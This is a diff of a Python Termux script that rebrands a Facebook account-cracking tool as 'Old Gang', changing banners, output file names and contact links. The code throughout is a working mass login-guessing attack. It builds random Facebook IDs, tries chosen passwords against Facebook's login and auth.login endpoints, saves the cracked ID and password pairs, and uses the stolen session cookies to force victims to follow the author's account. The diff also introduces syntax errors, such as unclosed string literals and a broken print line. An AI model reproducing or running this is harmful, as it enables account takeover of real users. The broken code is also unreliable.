@@ -88,9 +88,9 @@ imt="-Setu4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.Akash-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.Old_Gang, 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.Akash-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.OLD_GANG, 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -227,7 +227,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] 𝑪𝒍𝒐𝒏𝒊𝒏𝒈 𝑺𝒕𝒂𝒓𝒕 𝑵𝒐𝒘 \n\033[1;96m [!] 𝑾𝒂𝒊𝒕 𝑭𝒐𝒓 𝑭𝒆𝒘 𝑴𝒊𝒏𝒖𝒕𝒆\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -308,7 +308,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[CLONE] %s/%s | [SUCCESSFULL] %s | [CHECKPOINT] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -330,10 +330,10 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [BRAND-CP] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [OLD-GANG_100%] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BRAND-CP.txt','a').write('%s\n' % wrt)
+				open('/sdcard/Old_Gang.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -347,7 +347,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[CLONE] %s/%s  [SUCCESSFULL] %s |  [CHECKPOINT]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -361,17 +361,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [ZANAB-MadeehaI] {idf} * {pw}')
+				rint( f'\r\x1b[1;92m [OLD-GANG] {idf} * {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [OLD-GANG -SUCCESSFULL] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [OLD-GANG_100%] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/OLD-GANG -SUCCESSFULL','a').write('%s\n' % wrt)
+				open('/sdcard/OLD-GANG_100%,'a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -384,7 +384,7 @@ def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	r = sop(ses.get('https://www.facebook.com/Kingz.Tor.Abbu', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
-	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+	ses.get(('https://www.facebook.com/Kingz.Tor.Abbu' + str(get)), cookies={'cookie': coki}).text
  
 logo = """
 '##:::::::'####:'##::::'##:'########:
@@ -424,22 +424,22 @@ class Main:
 		print(logo)
 		print("")
 		print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
-		print("\033[1;37m𝗡𝗢𝗧𝗘 : 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹  𝗙ollow THIS ACCOUNT ")
+		print("\033[1;37m𝗡𝗢𝗧𝗘 : 𝑨𝒑𝒑𝒓𝒐𝒗𝒂𝒍  𝑰𝒏𝒃𝒐𝒙 𝑻𝒉𝒊𝒔 𝑨𝒄𝒄𝒐𝒖𝒏𝒕 ")
 		print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
 		
 		
 		print("")
-		print("\033[1;37m [1] 𝗙𝗶𝗿𝘀𝘁 FOLLOW MY ACCOUNT ")
+		print("\033[1;37m [1] 𝑨𝒑𝒏𝒆𝒓 𝑲𝒆𝒚 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑬𝒓 𝑱𝒐𝒏𝒏𝒐 𝑰𝒏𝒃𝒐𝒙 𝑲𝒐𝒓𝒖𝒏 ")
 		print("\033[1;37m [2] 𝗘𝘅𝗶𝘁")
 		print("")
 		Baloch = input("\n\033[1;37m  Choose : \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
-			print("    Thanks♥️")
+			print("    Welcome♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/profile.php?id=100085565361943 ")
+			os.system("xdg-open https://www.facebook.com/Kingz.Tor.Abbu ")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜??𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
@@ -481,7 +481,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CLONE LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -494,7 +494,7 @@ class Main:
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("%s [*] CLONE WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
@@ -506,7 +506,7 @@ class Main:
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using our tool...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -875,7 +875,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [+]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /[CLONE]>%s -> [SUCCESSFULL]:-%s - [CHECKPOINT]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -892,15 +892,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[AKASH-SUCCESSFULL]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[OLD-GANG_100%] %s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("AKASH-SUCCESSFULL.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("OLD-GANG.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[AKASH-SUCCESSFULL] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[OLD-GANG_100%] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("AKASH-SUCCESSFULL.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("OLD-GANG.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -912,7 +912,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL I'D CLONE LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -925,7 +925,7 @@ class Main:
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("%s [*] CLONE WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
@@ -937,7 +937,7 @@ class Main:
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING OUR TOOL...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[OLD GANG ER SATHE THAKAR JONNO DHONNOBAD...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -1306,7 +1306,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [+]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[CLONE]>%s -> [Successfull]:-%s - [CheckPoint]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1316,22 +1316,22 @@ class Main:
 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
 				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"x-fb-connection-type": "cell.OLD-GANG-",
 				"user-agent": rua, 
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[ZANAB-SUCCESSFULL] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[OLD-GANG_100%] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("AKASH-SUCCESSFULL.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("OLD.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[AKASH-SUCCESSFULL] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[OLD-GANG_100%] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("AKASH.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("OLD.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1339,10 +1339,10 @@ class Main:
 		self.loop +=1
  
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.Akash-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.Old_Gang', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://raw.githubusercontent.com/Akash-RKS/Hard-update/main/approval.txt").text
+	r1=requests.get("https://raw.githubusercontent.com/mahfuj420/Old_Gang/main/approval.txt").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1355,21 +1355,21 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m Akash Toll Paid You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : Paid tools working ⚒  \033[1;37m")
+		print(" \033[1;32m 𝑶𝒍𝒅 𝑮𝒂𝒏𝒈 𝑷𝒂𝒊𝒅 𝑻𝒐𝒐𝒍 𝑭𝒓𝒆𝒆 𝑱𝒖𝒔𝒕 𝑰𝒏𝒃𝒐𝒙\033[1;37m\n")
+		print(" \033[1;32m 𝑷𝒂𝒊𝒅 𝑻𝒐𝒐𝒍 𝑭𝒓𝒆𝒆 𝑻𝒆 𝑫𝒊𝒃𝒆 𝑶𝒍𝒅 𝑮𝒂𝒏𝒈 😒⚒  \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
-		print(" Copy And Send Key To Admin")
+		print(" 𝑪𝒐𝒑𝒚 𝑨𝒏𝒅 𝑷𝒂𝒔𝒕𝒆 𝑲𝒆𝒚 𝑰𝒏𝒃𝒐𝒙")
 		print ("")
-		print (" Your Key : "+ak+Akash+key1)
+		print (" Your Key : "☆Old☆Gang☆Key1)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Akash+''+key1
-		os.system('am start https://wa.me/+8801721474011?text=' + tks)
+		tks = 'Free%20Te,%20Log%20In%20Approved%20Key%20Nite%20%20%20Ashchi%20😁😁%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Akash+''+key1
+		os.system('am start https://www.facebook.com/Kingz.Tor.Abbu' + tks)
 		Subscraption() 
 Subscraption() 
 
